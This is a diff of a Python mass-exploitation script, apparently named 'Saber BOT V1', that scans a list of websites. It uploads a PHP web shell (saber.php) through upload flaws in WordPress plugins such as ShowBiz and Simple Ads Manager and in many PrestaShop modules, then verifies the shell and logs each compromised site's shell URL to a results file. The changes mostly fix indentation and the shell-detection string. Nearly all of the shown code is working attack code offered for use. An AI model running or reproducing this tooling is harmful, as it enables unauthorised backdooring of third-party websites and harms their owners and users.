-            	print color.RED+"[ZoomSound]-Not Vulun"
+                print color.RED+"[ZoomSound]-Not Vulun"
         except :
             pass
 def showbiz(site):
-    	global jcsh
+        global jcsh
         UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
         Exploit = site + '/wp-admin/admin-ajax.php'
         data = {'action': "showbiz_ajax_action", 'client_action': "update_plugin"}
@@ -715,12 +716,12 @@ def showbiz(site):
             if '/wp-content/plugins/showbiz//' in CheckRevslider.text.encode('utf-8'):
                 requests.post(Exploit, files=FileShell, data=data, headers=UserAgent, timeout=5)
                 ShellCheck = requests.get(site +'/wp-content/plugins/showbiz/temp/update_extract//saber.php', timeout=5)
-                if 'Saber' in ShellCheck.content :
+                if 'Saber BOT V1' in ShellCheck.content :
                     print color.GREEN+"[revslider Shell]-VULUN > "+site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'
                     save= open('results/shells.txt', 'a')
                     save.write(site+'/wp-content/plugins/showbiz/temp/update_extract//saber.php'+'\n')
             else:
-            	print color.RED+"[ShowBiz]-NOT VULUN"
+                print color.RED+"[ShowBiz]-NOT VULUN"
         except:
             print color.RED+"[ShowBiz]-Not Vulun"
             pass
@@ -734,13 +735,13 @@ def simpleadsmanager(site):
         try : 
             req = requests.post(url, files=files, data=post)
             ww = requests.get(site+"//wp-content/plugins/simple-ads-manager/saber.php")
-            if 'Saber' in ww.content :
+            if 'Saber BOT V1' in ww.content :
                 print color.GREEN+site+"//wp-content/plugins/simple-ads-manager/saber.php"
                 save = open('results/shells.txt', 'a')
-                save.write(site+"//wp-content/plugins/simple-ads-manager/saber.php")
+                save.write(site+"//wp-content/plugins/simple-ads-manager/saber.php"+'\n')
                 save.close()
             else:
-            	print color.RED+"[SimpleAdsManager]-NOt Vulun"
+                print color.RED+"[SimpleAdsManager]-NOt Vulun"
         except :
             pass
 #prestazebi
@@ -751,7 +752,7 @@ def columnadverts(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/columnadverts/slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[PhPCalendarEvenet]-Vulun : "+site+'/modules/columnadverts/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/columnadverts/slides/saber.php'+'\n')
@@ -768,7 +769,7 @@ def attributewizardpro(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[attributewizardpro]-Vulun : "+site+'/modules/attributewizardpro/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/attributewizardpro/slides/saber.php'+'\n')
@@ -786,7 +787,7 @@ def soopamobile(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/soopamobile/slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[SoopaMobile]-Vulun : "+site+'/modules/soopamobile/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/soopamobile/slides/saber.php'+'\n')
@@ -803,7 +804,7 @@ def attributewizardproOLD(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[attributewizardproOLD]-Vulun : "+site+'/modules/attributewizardproOLD/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/attributewizardproOLD/slides/saber.php'+'\n')
@@ -821,7 +822,7 @@ def soopabanners(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/soopabanners/slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[soopabanners]-Vulun : "+site+'/modules/soopabanners/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/soopabanners/slides/saber.php'+'\n')
@@ -838,7 +839,7 @@ def vtermslideshow(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/vtermslideshow/slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[vtermslideshow]-Vulun : "+site+'/modules/vtermslideshow/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/vtermslideshow/slides/saber.php'+'\n')
@@ -855,7 +856,7 @@ def simpleslideshow(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[simpleslideshow]-Vulun : "+site+'/modules/simpleslideshow/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/simpleslideshow/slides/saber.php'+'\n')
@@ -872,7 +873,7 @@ def homepageadvertise2(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[homepageadvertise2]-Vulun : "+site+'/modules/homepageadvertise2/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/homepageadvertise2/slides/saber.php'+'\n')
@@ -889,7 +890,7 @@ def jro_homepageadvertise(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[jro_homepageadvertise]-Vulun : "+site+'/modules/jro_homepageadvertise/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/jro_homepageadvertise/slides/saber.php'+'\n')
@@ -906,7 +907,7 @@ def oneattributewizardpro(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[oneattributewizardpro]-Vulun : "+site+'/modules/oneattributewizardpro/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/oneattributewizardpro/slides/saber.php'+'\n')
@@ -923,7 +924,7 @@ def attributewizardpro_x(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[attributewizardpro_x]-Vulun : "+site+'/modules/attributewizardpro_x/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/attributewizardpro_x/slides/saber.php'+'\n')
@@ -941,7 +942,7 @@ def productpageadverts(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[productpageadverts]-Vulun : "+site+'/modules/productpageadverts/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/productpageadverts/slides/saber.php'+'\n')
@@ -958,7 +959,7 @@ def homepageadvertise(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[homepageadvertise]-Vulun : "+site+'/modules/homepageadvertise/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/homepageadvertise/slides/saber.php'+'\n')
@@ -975,7 +976,7 @@ def videostab(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[videostab]-Vulun : "+site+'/modules/videostab/slides/saber.php.mp4'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/videostab/slides/saber.php.mp4'+'\n')
@@ -992,7 +993,7 @@ def wg24themeadministration(site):
         exp = site+Exploit
         GoT = requests.post(exp, files=ShellFile, timeout=5)
         checkk = requests.get(site+'/modules/   /slides/saber.php')
-        if 'Saber' in checkk.content :
+        if 'Saber BOT V1' in checkk.content :
             print color.GREEN+"[wg24themeadministration]-Vulun : "+site+'/modules/wg24themeadministration/slides/saber.php'
             save = open('resulst/shells.txt', 'a')
             save.write(site+'/modules/wg24themeadministration/slides/saber.php'+'\n')
@@ -1156,8 +1157,8 @@ def normal():
     file = open(lista).readlines()
     if (len(file) > 0):
         for zeb in file:
-        	nouna = zeb.rstrip()
-        	check(nouna)
+            nouna = zeb.rstrip()
+            check(nouna)
 def clear():
     if os.name == 'nt':
         os.system('cls')
@@ -1177,14 +1178,14 @@ class color:
    END = '\033[0m'
 clear()
 def banner():
-	print color.BOLD+logo
-	print color.BOLD+"[1]MultiThread Scan"
-	print color.BOLD+"[2]SingleThread Scan"
-	ch = raw_input(">")
-	if ch == '1':
-		print "usage : python "+sys.argv[0]+" list.txt"
-	if ch == '2':
-		normal()
+    print color.BOLD+logo
+    print color.BOLD+"[1]MultiThread Scan"
+    print color.BOLD+"[2]SingleThread Scan"
+    ch = raw_input(">")
+    if ch == '1':
+        print "usage : python "+sys.argv[0]+" list.txt"
+    if ch == '2':
+        normal()
 banner()
 try:
     target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
